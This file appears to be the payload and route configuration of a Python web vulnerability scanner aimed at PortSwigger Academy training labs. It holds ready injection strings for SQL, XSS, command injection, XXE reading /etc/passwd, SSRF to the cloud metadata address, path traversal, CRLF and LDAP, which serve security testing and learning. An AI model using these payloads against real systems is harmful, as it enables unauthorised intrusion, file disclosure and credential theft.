"""Rotas e payloads prioritários para labs PortSwigger Web Security Academy."""
from __future__ import annotations

from urllib.parse import urlparse

from vulndix.models import VulnType

# Todas as categorias de teste (fuzz ativo + passivas)
ALL_SCAN_CATEGORIES: frozenset[VulnType] = frozenset(
    {
        "sqli",
        "xss",
        "lfi",
        "traversal",
        "cmdi",
        "ssti",
        "redirect",
        "nosql",
        "ssrf",
        "xxe",
        "host_header",
        "cors",
        "idor",
        "info",
        "clickjacking",
        "csrf",
        "crlf",
        "ldap",
        "sec_headers",
        "cookie_sec",
        "api_exposed",
    }
)

# Alias — preset Academy usa o mesmo conjunto de categorias
PORTSWIGGER_CATEGORIES: frozenset[VulnType] = ALL_SCAN_CATEGORIES

# Caminhos típicos dos labs (enfileirados no crawl)
ACADEMY_PATHS: tuple[str, ...] = (
    "/",
    "/filter?category=Accessories",
    "/filter?category=Gifts",
    "/filter?category=Pets",
    "/filter?category=Corporate+gifts",
    "/product?productId=1",
    "/product?productId=2",
    "/login",
    "/register",
    "/my-account",
    "/cart",
    "/search",
    "/admin",
    "/admin/delete",
    "/feedback",
    "/email",
    "/password-reset",
    "/forgot-password",
)


def academy_seed_urls(base_url: str) -> list[str]:
    p = urlparse(base_url)
    root = f"{p.scheme}://{p.netloc}"
    return [root + path if path.startswith("/") else f"{root}/{path}" for path in ACADEMY_PATHS]


# Payloads testados primeiro por categoria (labs PortSwigger)
PRIORITY_PAYLOADS: dict[VulnType, tuple[str, ...]] = {
    "sqli": (
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR '1'='1",
        "') OR ('1'='1'--",
        "' OR 1=1#",
        "1' OR '1'='1",
        "admin'--",
        "'",
        "1' UNION SELECT NULL--",
    ),
    "xss": (
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "{{MARKER}}",
        "javascript:alert(1)",
    ),
    "nosql": (
        '{"$gt":""}',
        "' || '1'=='1",
        "admin' || '1'=='1",
        '{"$ne":null}',
        "true, $where: '1 == 1'",
        "'; return true; var a='",
    ),
    "ssrf": (
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://localhost/",
        "http://169.254.169.254/",
        "http://[::1]/",
        "http://127.1/",
        "file:///etc/passwd",
    ),
    "xxe": (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ),
    "cmdi": (";whoami", "|whoami", "& whoami", "`whoami`", "$(whoami)", ";id", "|id"),
    "ssti": ("{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "${{7*7}}"),
    "lfi": ("../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd"),
    "traversal": ("../", "..%2f", "....//....//etc/passwd"),
    "redirect": (
        "https://evil.example.test",
        "//evil.example.test",
        "/redirect?url=https://evil.example.test",
    ),
    "host_header": (
        "127.0.0.1",
        "localhost",
        "evil.example.test",
    ),
    "crlf": (
        "%0d%0aSet-Cookie:%20injected=1",
        "%0d%0aX-Injected:%201",
        "\r\nSet-Cookie: injected=1",
        "%0aSet-Cookie:%20injected=1",
    ),
    "ldap": (
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "x' or '1'='1",
        ")(cn=))",
    ),
}
